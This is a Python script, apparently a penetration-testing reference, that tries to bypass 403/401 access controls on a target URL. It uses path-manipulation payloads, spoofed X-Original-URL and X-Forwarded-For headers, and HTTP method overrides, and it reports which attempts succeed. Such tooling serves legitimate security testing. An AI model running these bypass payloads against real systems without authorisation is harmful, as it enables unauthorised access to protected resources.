#!/usr/bin/env python3
"""
Reference example: 403/401 Bypass Testing

This file is a reference implementation illustrating how to test for
403/401 bypass vulnerabilities using path manipulation, header injection,
and HTTP method overrides. Adapt to your specific target application.

CLI Alternative to: Burp Suite 403 Bypasser, byp4xx

Usage:
    python bypass_403.py --url "http://target.com/admin" --output results.json
    python bypass_403.py --url "http://target.com/admin" --cookie "session=abc123"
"""
import argparse
import json
import hashlib
import requests
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urljoin
import os

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Response size limit
MAX_RESPONSE_SIZE = 8 * 1024

# Path manipulation payloads
PATH_PAYLOADS = [
    "/{path}/",
    "/{path}/.",
    "/{path}/..",
    "/{path}%00",
    "/{path}%20",
    "/{path}%09",
    "/%2e/{path}",
    "/;/{path}",
    "/.;/{path}",
    "/..;/{path}",
    "//{path}//",
    "/{path}..;/",
    "/{path}/../{path}",
    "/{PATH}",  # Case variation
    "/{path}.json",
    "/{path}.html",
    "/{path}?",
    "/{path}#",
]

# Header injection payloads
HEADER_PAYLOADS = [
    {"X-Original-URL": "/{path}"},
    {"X-Rewrite-URL": "/{path}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/{path}", "X-Forwarded-For": "127.0.0.1"},
]

# HTTP methods to try
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

# Method override headers
METHOD_OVERRIDE_HEADERS = [
    {"X-HTTP-Method": "GET"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
]


def truncate_and_hash(response_text: str) -> tuple:
    """Truncate response and compute hash"""
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]
    is_truncated = len(response_text) > MAX_RESPONSE_SIZE

    return truncated, f"sha256:{full_hash}", is_truncated, len(response_text)


def test_path_bypass(
    base_url: str,
    path: str,
    session: requests.Session,
    timeout: int = 10
) -> List[Dict[str, Any]]:
    """Test path manipulation bypasses"""
    results = []

    for payload_template in PATH_PAYLOADS:
        # Replace placeholders
        payload = payload_template.replace("{path}", path).replace("{PATH}", path.upper())
        test_url = urljoin(base_url, payload)

        try:
            resp = session.get(test_url, timeout=timeout, verify=False, allow_redirects=False)
            snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

            result = {
                "type": "path_manipulation",
                "payload": payload,
                "url": test_url,
                "method": "GET",
                "status_code": resp.status_code,
                "response_snippet": snippet[:500],
                "response_hash": resp_hash,
                "truncated": truncated,
                "original_size_bytes": orig_size,
                "bypass_success": resp.status_code == 200
            }
            results.append(result)

        except requests.RequestException as e:
            results.append({
                "type": "path_manipulation",
                "payload": payload,
                "url": test_url,
                "error": str(e)
            })
        except Exception as e:
            # Handle URL parsing errors (LocationParseError, etc.)
            results.append({
                "type": "path_manipulation",
                "payload": payload,
                "url": test_url,
                "error": f"URL parse error: {str(e)}"
            })

    return results


def test_header_bypass(
    url: str,
    path: str,
    session: requests.Session,
    timeout: int = 10
) -> List[Dict[str, Any]]:
    """Test header injection bypasses"""
    results = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    for header_template in HEADER_PAYLOADS:
        # Replace path placeholders in headers
        headers = {k: v.replace("{path}", path) for k, v in header_template.items()}

        try:
            # For X-Original-URL, request root and let header specify path
            if "X-Original-URL" in headers or "X-Rewrite-URL" in headers:
                test_url = base_url + "/"
            else:
                test_url = url

            resp = session.get(test_url, headers=headers, timeout=timeout,
                             verify=False, allow_redirects=False)
            snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

            result = {
                "type": "header_injection",
                "headers": headers,
                "url": test_url,
                "method": "GET",
                "status_code": resp.status_code,
                "response_snippet": snippet[:500],
                "response_hash": resp_hash,
                "truncated": truncated,
                "original_size_bytes": orig_size,
                "bypass_success": resp.status_code == 200
            }
            results.append(result)

        except requests.RequestException as e:
            results.append({
                "type": "header_injection",
                "headers": headers,
                "url": test_url,
                "error": str(e)
            })

    return results


def test_method_bypass(
    url: str,
    session: requests.Session,
    timeout: int = 10
) -> List[Dict[str, Any]]:
    """Test HTTP method variations and overrides"""
    results = []

    # Test different HTTP methods
    for method in HTTP_METHODS:
        try:
            resp = session.request(method, url, timeout=timeout,
                                 verify=False, allow_redirects=False)
            snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

            result = {
                "type": "method_variation",
                "method": method,
                "url": url,
                "status_code": resp.status_code,
                "response_snippet": snippet[:500],
                "response_hash": resp_hash,
                "truncated": truncated,
                "original_size_bytes": orig_size,
                "bypass_success": resp.status_code == 200
            }
            results.append(result)

        except requests.RequestException as e:
            results.append({
                "type": "method_variation",
                "method": method,
                "url": url,
                "error": str(e)
            })

    # Test method override headers (POST with override)
    for override_headers in METHOD_OVERRIDE_HEADERS:
        try:
            resp = session.post(url, headers=override_headers, timeout=timeout,
                              verify=False, allow_redirects=False)
            snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

            result = {
                "type": "method_override",
                "method": "POST",
                "override_headers": override_headers,
                "url": url,
                "status_code": resp.status_code,
                "response_snippet": snippet[:500],
                "response_hash": resp_hash,
                "truncated": truncated,
                "original_size_bytes": orig_size,
                "bypass_success": resp.status_code == 200
            }
            results.append(result)

        except requests.RequestException as e:
            results.append({
                "type": "method_override",
                "method": "POST",
                "override_headers": override_headers,
                "url": url,
                "error": str(e)
            })

    return results


def test_403_bypass(
    url: str,
    cookie: Optional[str] = None,
    header: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Main 403/401 bypass testing function

    Args:
        url: Target URL that returns 403/401
        cookie: Optional session cookie (format: "name=value; name2=value2")
        header: Optional custom header (format: "Header-Name: value")
        timeout: Request timeout in seconds

    Returns:
        Dictionary with baseline and all bypass test results
    """
    session = requests.Session()

    # Set cookies if provided
    if cookie:
        for c in cookie.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                session.cookies.set(name.strip(), value.strip())

    # Set custom headers if provided
    if header:
        if ":" in header:
            name, value = header.split(":", 1)
            session.headers[name.strip()] = value.strip()

    # Parse URL to extract path
    parsed = urlparse(url)
    path = parsed.path or "/"
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Get baseline response
    try:
        baseline_resp = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
        baseline_snippet, baseline_hash, baseline_truncated, baseline_size = truncate_and_hash(baseline_resp.text)

        baseline = {
            "url": url,
            "method": "GET",
            "status_code": baseline_resp.status_code,
            "response_snippet": baseline_snippet[:500],
            "response_hash": baseline_hash,
            "truncated": baseline_truncated,
            "original_size_bytes": baseline_size
        }
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "baseline": None,
            "bypasses": []
        }

    # Only proceed if baseline returns 403 or 401
    if baseline_resp.status_code not in [401, 403]:
        return {
            "status": "UNVALIDATED",
            "reason": f"URL does not return 403/401 (got {baseline_resp.status_code})",
            "baseline": baseline,
            "bypasses": []
        }

    # Run all bypass tests
    bypasses = []
    bypasses.extend(test_path_bypass(base_url, path, session, timeout))
    bypasses.extend(test_header_bypass(url, path, session, timeout))
    bypasses.extend(test_method_bypass(url, session, timeout))

    # Find successful bypasses
    successful = [b for b in bypasses if b.get("bypass_success")]

    # Determine status
    if successful:
        status = "VALIDATED"
        evidence = f"Found {len(successful)} bypass(es) for {url}"
    else:
        status = "FALSE_POSITIVE"
        evidence = f"No bypasses found - access control working correctly"

    return {
        "status": status,
        "baseline": baseline,
        "bypasses": bypasses,
        "successful_bypasses": successful,
        "evidence": evidence
    }


def main():
    parser = argparse.ArgumentParser(description="403/401 Bypass Testing Script")
    parser.add_argument("--url", required=True, help="Target URL returning 403/401")
    parser.add_argument("--cookie", help="Session cookie (name=value; name2=value2)")
    parser.add_argument("--header", "-H", help="Custom header (Header-Name: value)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--output", "-o", required=True, help="Output JSON file")

    args = parser.parse_args()

    print(f"[*] Testing 403/401 bypass on: {args.url}")

    result = test_403_bypass(
        url=args.url,
        cookie=args.cookie,
        header=args.header,
        timeout=args.timeout
    )

    with open(args.output, 'w') as f:
        json.dump(result, f, indent=2)

    print(f"[*] Status: {result['status']}")
    print(f"[*] Evidence: {result.get('evidence', 'N/A')}")

    if result.get('successful_bypasses'):
        print(f"[!] Found {len(result['successful_bypasses'])} successful bypass(es):")
        for bypass in result['successful_bypasses']:
            print(f"    - {bypass.get('type')}: {bypass.get('payload', bypass.get('method', 'N/A'))}")

    print(f"[*] Results saved to: {args.output}")

    return 0 if result['status'] != 'UNVALIDATED' else 1


if __name__ == "__main__":
    exit(main())
